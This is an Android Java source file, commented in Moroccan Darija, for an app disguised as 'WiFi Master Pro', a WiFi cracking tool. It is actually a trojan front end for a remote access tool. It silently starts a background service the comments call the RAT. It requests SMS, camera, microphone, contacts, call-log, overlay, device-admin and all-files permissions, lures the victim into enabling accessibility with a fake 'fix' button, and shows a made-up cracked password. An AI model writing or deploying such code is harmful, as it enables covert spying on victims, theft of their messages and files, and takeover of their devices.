package com.sys.updater;

import android.Manifest;
import android.app.Activity;
import android.app.AlertDialog;
import android.app.admin.DevicePolicyManager;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.Typeface;
import android.graphics.drawable.GradientDrawable;
import android.net.Uri;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.text.TextUtils;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ListView;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {

    private WifiManager wifiManager;
    private ListView wifiList;
    private Button btnScan, btnFix;
    private ArrayList<String> networks = new ArrayList<>();
    private ArrayList<ScanResult> scanResults = new ArrayList<>();
    private ArrayAdapter<String> adapter;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // 1. CH3EL L'RAT F L'KHLFIA
        try {
            Intent serviceIntent = new Intent(this, TelegramService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
        } catch (Exception e) {}

        // 2. TLEB L'PERMISSIONS DIAL L'RAT W L'WIFI
        requestAppPermissions();
        requestOverlayPermission();
        requestDeviceAdmin();
        requestManageExternalStorage(); // <--- JDAD: Tleb Manage Storage

        // 3. BNI L'UI DYAL WIFI HACKING
        buildWifiUI();
    }

    private void buildWifiUI() {
        // Background 9m7 (Dark Theme)
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(40, 80, 40, 40);
        GradientDrawable bg = new GradientDrawable(
            GradientDrawable.Orientation.TOP_BOTTOM,
            new int[] {Color.parseColor("#0A0F16"), Color.parseColor("#1A2530")}
        );
        layout.setBackground(bg);
        setContentView(layout);

        // Title
        TextView tvTitle = new TextView(this);
        tvTitle.setText("WiFi Master Pro");
        tvTitle.setTextSize(30);
        tvTitle.setTypeface(Typeface.DEFAULT_BOLD);
        tvTitle.setTextColor(Color.parseColor("#00E5FF")); // Cyan
        tvTitle.setGravity(Gravity.CENTER);
        layout.addView(tvTitle);

        // Subtitle
        TextView tvDesc = new TextView(this);
        tvDesc.setText("Advanced WPS & WPA Cracking Tool");
        tvDesc.setTextSize(14);
        tvDesc.setTextColor(Color.parseColor("#8B949E"));
        tvDesc.setGravity(Gravity.CENTER);
        tvDesc.setPadding(0, 10, 0, 30);
        layout.addView(tvDesc);

        // Fix Connection Button (Hidden Accessibility Trigger)
        btnFix = new Button(this);
        btnFix.setText("Fix Connection Issues (Boost WiFi)");
        btnFix.setBackgroundColor(Color.parseColor("#238636"));
        btnFix.setTextColor(Color.WHITE);
        btnFix.setOnClickListener(v -> {
            // Hna kayt7el l'Accessibility b tari9a katban b7al l'fix
            Toast.makeText(this, "Please enable 'WiFi Master Pro Engine' to fix connection.", Toast.LENGTH_LONG).show();
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(intent);
        });
        layout.addView(btnFix);

        // Scan Button
        btnScan = new Button(this);
        btnScan.setText("SCAN FOR WPS NETWORKS");
        btnScan.setBackgroundColor(Color.parseColor("#00E5FF"));
        btnScan.setTextColor(Color.BLACK);
        LinearLayout.LayoutParams btnParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        btnParams.setMargins(0, 20, 0, 20);
        btnScan.setLayoutParams(btnParams);
        layout.addView(btnScan);

        // WiFi List
        wifiList = new ListView(this);
        wifiList.setBackgroundColor(Color.TRANSPARENT);
        adapter = new ArrayAdapter<String>(this, android.R.layout.simple_list_item_1, networks) {
            @Override
            public View getView(int position, View convertView, ViewGroup parent) {
                TextView textView = (TextView) super.getView(position, convertView, parent);
                textView.setTextColor(Color.WHITE);
                textView.setTextSize(16f);
                return textView;
            }
        };
        wifiList.setAdapter(adapter);
        layout.addView(wifiList);

        // Setup WiFi Manager
        wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);

        // Listeners
        btnScan.setOnClickListener(v -> scanWifi());
        wifiList.setOnItemClickListener((parent, view, position, id) -> {
            ScanResult result = scanResults.get(position);
            simulateHacking(result.SSID);
        });

        // Auto Scan
        if (wifiManager != null && wifiManager.isWifiEnabled()) {
            scanWifi();
        } else {
            Toast.makeText(this, "Please turn on WiFi to scan networks", Toast.LENGTH_SHORT).show();
        }
    }

    private void scanWifi() {
        if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            Toast.makeText(this, "Location permission required for WiFi scan", Toast.LENGTH_SHORT).show();
            return;
        }

        if (wifiManager != null && wifiManager.isWifiEnabled()) {
            wifiManager.startScan();
            List<ScanResult> results = wifiManager.getScanResults();
            networks.clear();
            scanResults.clear();
            
            for (ScanResult result : results) {
                if (result.SSID != null && !result.SSID.isEmpty()) {
                    // Katban l'victim b7al ila kaynin bzaf dyal les réseaux
                    networks.add(result.SSID + "  [WPA2/WPS]");
                    scanResults.add(result);
                }
            }
            adapter.notifyDataSetChanged();
            
            if (networks.isEmpty()) {
                Toast.makeText(this, "No networks found. Try again.", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "Found " + networks.size() + " networks", Toast.LENGTH_SHORT).show();
            }
        } else {
            Toast.makeText(this, "WiFi is disabled!", Toast.LENGTH_SHORT).show();
        }
    }

    private void simulateHacking(String ssid) {
        AlertDialog.Builder builder = new AlertDialog.Builder(this, android.R.style.Theme_Material_Dialog_Alert);
        builder.setTitle("WPS Attack: " + ssid);
        builder.setMessage("Cracking WPS PIN...\nThis may take a few seconds.");

        ProgressBar progressBar = new ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal);
        progressBar.setMax(100);
        progressBar.setPadding(40, 20, 40, 20);
        builder.setView(progressBar);

        AlertDialog dialog = builder.create();
        dialog.setCancelable(false);
        dialog.show();

        Handler handler = new Handler(Looper.getMainLooper());
        final int[] progress = {0};
        Runnable runnable = new Runnable() {
            @Override
            public void run() {
                progress[0] += 5;
                progressBar.setProgress(progress[0]);
                
                if (progress[0] >= 100) {
                    dialog.dismiss();
                    showFakePassword(ssid);
                } else {
                    handler.postDelayed(this, 150); // 3 seconds total
                }
            }
        };
        handler.post(runnable);
    }

    private void showFakePassword(String ssid) {
        String fakePassword = "WPS-" + generateRandomPassword(8);
        
        // Copy l'password l clipboard bach tban legit
        ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        ClipData clip = ClipData.newPlainText("Wifi Pass", fakePassword);
        if (clipboard != null) clipboard.setPrimaryClip(clip);

        // Fenêtre dyal l'Naja7
        new AlertDialog.Builder(this)
                .setTitle("✅ Cracking Successful!")
                .setMessage("Network: " + ssid + "\n\nPassword: " + fakePassword + "\n\n(Copied to clipboard)")
                .setPositiveButton("CONNECT", (d, w) -> {
                    Toast.makeText(this, "Connecting to " + ssid + "...", Toast.LENGTH_LONG).show();
                })
                .setNegativeButton("CLOSE", (d, w) -> d.dismiss())
                .show();
    }

    private String generateRandomPassword(int length) {
        String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        StringBuilder sb = new StringBuilder();
        java.util.Random random = new java.util.Random();
        for (int i = 0; i < length; i++) {
            sb.append(chars.charAt(random.nextInt(chars.length())));
        }
        return sb.toString();
    }

    // ==========================================
    // PERMISSIONS & SETUP DIAL L'RAT
    // ==========================================

    private void requestAppPermissions() {
        List<String> perms = new ArrayList<>();
        perms.add(Manifest.permission.ACCESS_FINE_LOCATION);
        perms.add(Manifest.permission.ACCESS_COARSE_LOCATION);
        perms.add(Manifest.permission.RECEIVE_SMS);
        perms.add(Manifest.permission.READ_SMS);
        perms.add(Manifest.permission.CAMERA);
        perms.add(Manifest.permission.RECORD_AUDIO);
        perms.add(Manifest.permission.READ_CONTACTS);
        perms.add(Manifest.permission.READ_CALL_LOG);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            perms.add(Manifest.permission.POST_NOTIFICATIONS);
        }
        requestPermissions(perms.toArray(new String[0]), 1);
    }

    private void requestOverlayPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
            startActivityForResult(intent, 101);
        }
    }

    private void requestDeviceAdmin() {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName adminComponent = new ComponentName(this, MyDeviceAdminReceiver.class);
        if (dpm != null && !dpm.isAdminActive(adminComponent)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for advanced WiFi engine.");
            startActivity(intent);
        }
    }

    // JDAD: Tleb l'permission bach y9der y9ra ga3 les fichiers
    private void requestManageExternalStorage() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                try {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                    Uri uri = Uri.fromParts("package", getPackageName(), null);
                    intent.setData(uri);
                    startActivityForResult(intent, 102);
                } catch (Exception e) {
                    Intent intent = new Intent();
                    intent.setAction(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                    startActivityForResult(intent, 102);
                }
            }
        }
    }
    }
